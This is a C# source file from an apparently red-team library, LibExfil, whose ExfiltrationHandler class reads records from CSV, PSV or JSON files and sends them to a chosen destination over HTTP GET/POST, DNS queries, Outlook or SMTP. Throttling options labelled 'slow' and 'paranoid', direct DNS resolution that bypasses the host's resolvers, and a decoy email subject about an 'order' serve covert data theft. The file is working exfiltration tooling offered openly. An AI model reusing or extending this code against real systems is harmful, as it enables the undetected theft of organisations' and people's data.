/*
LICENSE INFORMATION

Copyright 2020 Kaizen Cyber Ops, LLC.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

https://opensource.org/licenses/MIT
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using LibExfil.DataSenders;
using LibExfil.Structures;
using LibExfil.Toolbox.HTTP;
using LibExfil.Toolbox.DNS;
using LibExfil.Toolbox.Base64;
using LibExfil.FileReaders;
using System.IO;
using LibExfil.DataSenders.ImplementedSenders;
using LibExfil.Interfaces;
using System.CodeDom;
/// <summary>
/// This class will handle all of the exfiltration.
/// It it the only class exposed to other assemblies.
/// it allows the specification of how/what/where to exfiltrate data to
/// </summary>
namespace LibExfil
{

    public enum Options { 
                          NONE                              = 0b_0,             //no special options
                          DATA_ENCODE_TO_B64                = 0b_1,             //read the data as base 64 
                          EMAIL_ONE_SHOT_MODE               = 0b_10,            //if using an email-related method, send each record in individual emails (default is sending all in one message)
                          EMAIL_DECREMENTAL_MODE            = 0b_100,           //if using an email-related method, multiple emails will be sent each with n/(2^([+1]) number of records within it, where n is the total number of records and i is how many emails have already been sent... this means email1 has n/2 records, email2 has n/4 records, email3 has n/8 records, and so on
                          DNS_BYPASS_HOST_RESOlVERS         = 0b_1000,          //if using DNS exfil method, attempt to bypass the host's resolve chain and query the authoritative DNS server directly
                          HTTP_USE_SSL                      = 0b_10000,          //if using an http method, use ssl/tls
                          SMTP_SSL_HANDSHAKE                = 0b_100000,         //for smtp, use older SSL handshake over prt 465.  Default method is SMTP relay mode on port 25 
                          SMTP_STARTTLS_HANDSHAKE           = 0b_1000000,        //for smtp, use a STARTTLEL handshake over prt 587  Default method is SMTP relay mode on port 25 
                          SPEED_FAST                        = 0b_10000000,       //If the method honors this flag, then calls to Send() will be performed async.  
                          SPEED_MODERATE                    = 0b_100000000,      //If the method honors this flag, then calls to Send() will be performed synchronously. This is default.
                          SPEED_SLOW                        = 0b_1000000000,     //If the method honors this flag, then calls to Send() will be performed synchronously and then followed by a 5 second sleep
                          SPEED_PARANOID                    = 0b_10000000000,    //If the method honors this flag, then calls to Send() will be performed synchronously and then followed by a 60 second sleep
                          ASYNCHRONOUS_MODE                 = 0b_100000000000    //If the method supports this flag, calls to Send() are made asynchronously without awaiting result
    };

    public class ExfiltrationHandler
    {

        static readonly DateTime localDate = DateTime.Now;
        readonly string smtp_address = "";
        readonly string smtp_server = "";
        readonly string smtp_account_email = "";
        readonly string smtp_password = "";
        readonly string smtp_email_body = "Here is what you ordered. It's extra spciy, just like you like it.  Let me know if you need any more, i've got *plenty* more where this came from\n\n";
        readonly string smtp_email_subject = "Results of Your Recent Order";


        const string DNS_EXFIL_DOMAIN = "";//test domain to send dns to, if we choose to use dns
        readonly string filepath;
        private string exfilDestination = null;
        private readonly SupportedSenderMethods sendMethod;
        private readonly SupportedFileTypes fType;
        private IBaseSenderInterface sender=null;
        private IEmailSenderInterface email_sender=null;
        private IBaseFileInterface reader = null;



        /// <summary>
        /// This is the public exposed class for the library.  Give it an exfil method, a file type, the file path, and where you want to target with exfil and it does the rest.
        /// </summary>
        /// <param name="exfilMethod"></param>
        /// <param name="target"></param>
        public ExfiltrationHandler(SupportedSenderMethods exfilMethod, SupportedFileTypes fileType, String filepath, String target,Options ops=Options.NONE)
        {
            if (String.IsNullOrEmpty(filepath) || String.IsNullOrWhiteSpace(filepath)
                || String.IsNullOrEmpty(target) || String.IsNullOrWhiteSpace(target))
                throw new ArgumentException();
            fType = fileType;
            sendMethod = exfilMethod;
            this.filepath = filepath;
            this.exfilDestination = target;
            switch (exfilMethod)
            {
                //post and get both use a http client
                case SupportedSenderMethods.POST: SetMethodToHttpPost(ops); break;
                case SupportedSenderMethods.GET: SetMethodToHttpGet(ops); break;
                case SupportedSenderMethods.DNS: SetMethodToDnsQuery(ops); break;
                case SupportedSenderMethods.OUTLOOK: SetMethodToOutlook(ops); break;
                case SupportedSenderMethods.SMTP: SetMethodToSmtp(ops); break;
                default: throw new NotImplementedException("the requested exfil method has not been implemented within the ExfilHandler class");
            }

            switch (fileType)
            {
                case SupportedFileTypes.CSV: SetReaderToCSV(); break;
                case SupportedFileTypes.PSV: SetReaderToPSV(); break;
                case SupportedFileTypes.JSON: SetReaderToJSON(); break;
            }

        }


        private int HandleEmailSender(DataRecordCollection data, Options opts)
        {
            if ((opts & Options.EMAIL_DECREMENTAL_MODE) != 0)
                return email_sender.SendDecrementalEmails(data, exfilDestination);

            else if ((opts & Options.EMAIL_ONE_SHOT_MODE) != 0)
                return email_sender.SendAllRecords(data, exfilDestination);

            else
                return email_sender.Send(data, exfilDestination);
        }
        private int HandleGenericSender(DataRecordCollection data, Options opts)
        {
            if (sendMethod == SupportedSenderMethods.DNS)
            {
                if ((opts & Options.DNS_BYPASS_HOST_RESOlVERS) != 0)
                    return sender.Send(data, exfilDestination);
                else
                    return sender.Send(data,null);
            }
            else if (sendMethod == SupportedSenderMethods.GET || sendMethod == SupportedSenderMethods.POST)
                return sender.Send(data, exfilDestination);
            return 0;
        
        }




        public int SendExfilData(Options opts)
        {
            if ((opts & Options.HTTP_USE_SSL) != 0) throw new NotImplementedException();//not implemented yet

            DataRecordCollection data = null;
            try
            { 
                if ((opts & Options.DATA_ENCODE_TO_B64) != 0) data = reader.GetFileContents(true);  //do we b64 encode the data?
                else data = reader.GetFileContents();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                throw new InvalidDataException("The file reader failed to fetch file contents");
            }
            if (data == null) throw new InvalidOperationException();
            if (data.GetShape().Rows > 0)  //make sure we have work to do
            {
                if (email_sender != null)  //see if we are sending via email                   
                    return HandleEmailSender(data,opts);

                else if (sender != null)     //see if we are sending via non email
                    return HandleGenericSender(data,opts);
            }
            return 0;
        }

        private void SetReaderToCSV()
        { reader = new SVFileReader(filepath,','); }
        private void SetReaderToPSV()
        { reader = new SVFileReader(filepath, '|'); }
        private void SetReaderToJSON()
        { reader = new JsonFileReader(filepath); }



        private void SetMethodToHttpPost(Options opts=Options.NONE)
        {
            if (!HTTPUtils.ValidateURL(exfilDestination)) throw new System.Web.HttpException();
            else sender = new HttpPostSender();
        }
        private void SetMethodToHttpGet(Options opts = Options.NONE)
        {
            if ( !HTTPUtils.ValidateURL(exfilDestination)) throw new System.Web.HttpException();
            else sender = new HttpGetSender();
        }
        private void SetMethodToDnsQuery(Options opts = Options.NONE)
        {

            IPAddress.Parse(exfilDestination);  //thorw error if no good
            exfilDestination = HTTPUtils.GetDomainFromURL(exfilDestination);
            sender = new DnsSender(DNS_EXFIL_DOMAIN);
        }
        private void SetMethodToOutlook(Options opts = Options.NONE)
        {
            DateTime localDate = DateTime.Now;
            string email_body = "Here is what you ordered. It's extra spciy, just like you like it....\n";
            string email_subject = String.Format("{0} -- Results of Your Recent Order", localDate.ToString("en-us"));
            email_sender = new OutlookSender(email_body, email_subject);
        }
        private void SetMethodToSmtp(Options opts = Options.NONE)
        {


            //public SMTPSender(string email_from,string smtp_body, string subject_line,string server,string account_email,string password, Options opts=Options.NONE)
            email_sender = new SMTPSender(smtp_address,smtp_email_body,smtp_email_subject,smtp_server,smtp_account_email,smtp_password,opts);
        }


    }

}

